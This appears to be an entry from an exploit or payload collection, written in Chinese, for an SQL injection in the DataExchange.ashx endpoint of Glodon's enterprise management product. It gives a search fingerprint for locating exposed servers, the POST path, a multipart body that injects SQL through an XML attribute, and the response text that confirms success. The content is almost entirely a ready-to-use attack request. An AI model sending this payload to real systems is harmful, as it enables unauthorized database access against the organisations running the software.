# 广联达-DataExchange-Sql注入漏洞

广联达-DataExchange ｜ SQL注入 ｜ —
- **指纹**：`app="Glodon-企业管理产品"`
- **请求**：`POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1`

**Payload**
```
--12ef5586849044debc33731d4c32afd0
Content-Disposition: form-data; name="SystemName"
BIM
--12ef5586849044debc33731d4c32afd0
Content-Disposition: form-data; name="Params"
<rootElement dir="1' and 1=user and 'Hami'='Hami">
</rootElement>
--12ef5586849044debc33731d4c32afd0--
状态码200包含内容GB.LK.Document.WebSite
```